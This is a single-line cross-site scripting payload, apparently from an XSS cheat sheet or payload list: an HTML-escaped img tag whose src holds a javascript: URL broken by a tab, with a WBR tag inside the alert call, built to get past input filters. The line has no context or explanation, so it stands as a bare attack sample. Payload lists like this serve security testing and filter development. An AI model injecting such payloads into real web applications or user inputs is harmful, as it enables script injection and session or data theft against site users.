&lt;img src="jav	ascript:alert(&amp;lt;WBR&amp;gt;'XSS');"&gt;